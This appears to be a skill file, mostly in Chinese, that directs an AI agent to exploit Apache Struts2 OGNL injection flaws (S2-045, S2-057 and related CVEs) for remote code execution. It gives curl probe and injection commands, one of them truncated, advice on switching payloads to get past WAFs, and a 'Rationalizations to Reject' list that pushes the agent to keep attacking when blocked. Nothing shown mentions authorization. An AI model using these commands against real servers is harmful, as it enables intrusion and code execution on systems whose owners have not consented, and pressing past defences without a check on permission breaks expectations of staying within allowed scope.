---
name: struts2-ognl-rce
description: Exploits Apache Struts2 OGNL expression injection for RCE (S2-045, S2-046, S2-048, S2-057, S2-061). Use when target runs Java-based Struts2 framework with .action/.do endpoints.
skill_type: exploit
severity: critical
tags: [java, struts2, ognl, s2-045, s2-046, s2-057, s2-061]
cve: [CVE-2017-5638, CVE-2017-9805, CVE-2018-11776, CVE-2017-9791, CVE-2019-0230]
---

# Apache Struts2 OGNL 注入 RCE

## Essential Principles

1. **Struts2 用 OGNL（Object-Graph Navigation Language）解析用户输入**
2. **无专用脚本 —— 纯 curl + OGNL payload，内联执行**
3. **S2-057 最可靠**（URL 路径注入，WAF 难拦截，Shiro 不拦截）
4. **S2-045 次选**（Content-Type 头注入，部分 WAF 拦截）
5. **OGNL 回显需要注入特殊代码**，不同版本语法略有差异

## When to Use

- URL 以 .action / .do 结尾
- 响应含 struts、opensymphony、xwork 字样
- 扫描器报告 S2-xxx 系列 CVE
- `{ENDPOINT}/%24%7B233*233%7D/actionChain1.action` 返回 302 Location 含 54289

## When NOT to Use

- 非 Java Web 应用
- 无 .action/.do 端点
- Struts2 已升级至最新且配置安全拦截器

## Rationalizations to Reject

- "Content-Type 注入被 WAF 拦截" → 换 S2-057 URL 路径注入，WAF 通常不管 URL
- "S2-045 探测没反应" → 可能版本太新，试 S2-057 namespace 注入
- "只试了一个 payload" → OGNL 语法因版本而异，回显 payload 有多种变体

## 路径选择

| 条件 | 路径 | 方法 |
|------|------|------|
| multipart 请求可用 | **A: S2-045** | Content-Type 头注入 OGNL |
| URL 路径可控制 | **B: S2-057** | namespace URL 路径注入 |
| 文件上传接口 | **C: S2-046** | Content-Disposition filename 注入 |
| 全部失败 | **D: LLM 兜底** | ReAct 自由推理 |

## Quick Start

```bash
# 1. 确认 Struts2: S2-057 namespace OGNL 计算 233*233
curl -s -D - -o /dev/null "{ENDPOINT}/%24%7B233*233%7D/actionChain1.action" | grep 54289

# 2. S2-045 Content-Type 注入（首选）
curl -s -D - {ENDPOINT} \
  -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-S2-Test','S2-045-OK')}.multipart/form-data"

# 3. S2-045 回显 RCE
curl -s {ENDPOINT} -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}"
```

## 详细流程
- S2-045: [workflows/s2-045-exploit.md](workflows/s2-045-exploit.md)
- S2-057: [workflows/s2-057-exploit.md](workflows/s2-057-exploit.md)
- OGNL 参考: [references/ognl-payloads.md](references/ognl-payloads.md)
